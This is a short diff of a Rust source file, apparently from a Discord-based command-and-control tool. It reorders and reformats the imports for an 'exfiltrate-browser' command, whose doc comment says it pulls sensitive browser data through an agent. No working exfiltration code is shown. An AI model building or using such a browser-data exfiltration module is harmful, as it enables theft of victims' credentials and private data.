@@ -1,13 +1,18 @@
-use crate::os::download::{download_browser_module, generate_attachment};
 use crate::errors::DiscordC2Error;
+use crate::os::download::{download_browser_module, generate_attachment};
 
 use serenity::{
-    client::Context,
     builder::CreateApplicationCommand,
+    client::Context,
     model::{
         application::{
             command::CommandOptionType,
-            interaction::{InteractionResponseType, application_command::{CommandDataOption, CommandDataOptionValue, ApplicationCommandInteraction}},
+            interaction::{
+                application_command::{
+                    ApplicationCommandInteraction, CommandDataOption, CommandDataOptionValue,
+                },
+                InteractionResponseType,
+            },
         },
         channel::AttachmentType,
     },
@@ -15,7 +20,6 @@ use serenity::{
 
 use tempfile::TempDir;
 use uuid::Uuid;
-
 
 /// Registers the "exfiltrate-browser" application command with the provided `CreateApplicationCommand` builder.
 /// This command allows users to exfiltrate sensitive data from their browsers via the agent.
